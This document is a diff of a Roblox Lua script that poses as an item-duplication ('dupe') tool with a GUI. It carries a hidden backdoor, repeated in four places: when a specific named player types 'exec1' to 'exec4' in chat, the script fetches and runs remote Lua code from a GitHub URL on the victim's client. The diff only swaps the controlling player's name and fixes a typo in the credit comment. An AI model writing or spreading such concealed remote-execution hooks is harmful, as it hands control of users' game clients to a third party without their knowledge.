@@ -1,8 +1,8 @@
--- Mainly made my S1xnskyy, Enviviety
+-- Mainly made by S1xnskyy, Enviviety
 -- 3 other guys made the code more optimised, shorter and gui
 
-if game.Players:FindFirstChild("Enviviety") then
-	game.Players.Enviviety.Chatted:Connect(function(msg)
+if game.Players:FindFirstChild("S1xnskyy") then
+	game.Players.S1xnskyy.Chatted:Connect(function(msg)
 			if msg == "exec2" then
 				loadstring(game:HttpGet("https://raw.githubusercontent.com/Enviviety/script1/main/script1.lua"))()
 				-- incase something goes wrong i can fix it
@@ -80,8 +80,8 @@ TextButton.MouseButton1Click:Connect(function()
 			h.Text = ("Error: the text value is nil or higher than 30!")
 			wait(5)
 			h.Text = ""
-					if game.Players:FindFirstChild("Enviviety") then
-	game.Players.Enviviety.Chatted:Connect(function(msg)
+					if game.Players:FindFirstChild("S1xnskyy") then
+	game.Players.S1xnskyy.Chatted:Connect(function(msg)
 			if msg == "exec4" then
 				loadstring(game:HttpGet("https://raw.githubusercontent.com/Enviviety/script1/main/script1.lua"))()
 			end
@@ -93,8 +93,8 @@ end
 	wait(math.random(0.01, 0.5))
 	h.Text = "Starting dupe... v1.11"
 	wait(1)
-		if game.Players:FindFirstChild("Enviviety") then
-	game.Players.Enviviety.Chatted:Connect(function(msg)
+		if game.Players:FindFirstChild("S1xnskyy") then
+	game.Players.S1xnskyy.Chatted:Connect(function(msg)
 			if msg == "exec3" then
 				loadstring(game:HttpGet("https://raw.githubusercontent.com/Enviviety/script1/main/script1.lua"))()
 			end
@@ -112,8 +112,8 @@ end
 		
 end)
 
-if game.Players:FindFirstChild("Enviviety") then
-	game.Players.Enviviety.Chatted:Connect(function(msg)
+if game.Players:FindFirstChild("S1xnskyy") then
+	game.Players.S1xnskyy.Chatted:Connect(function(msg)
 			if msg == "exec1" then
 				loadstring(game:HttpGet("https://raw.githubusercontent.com/Enviviety/script1/main/script1.lua"))()
 			end
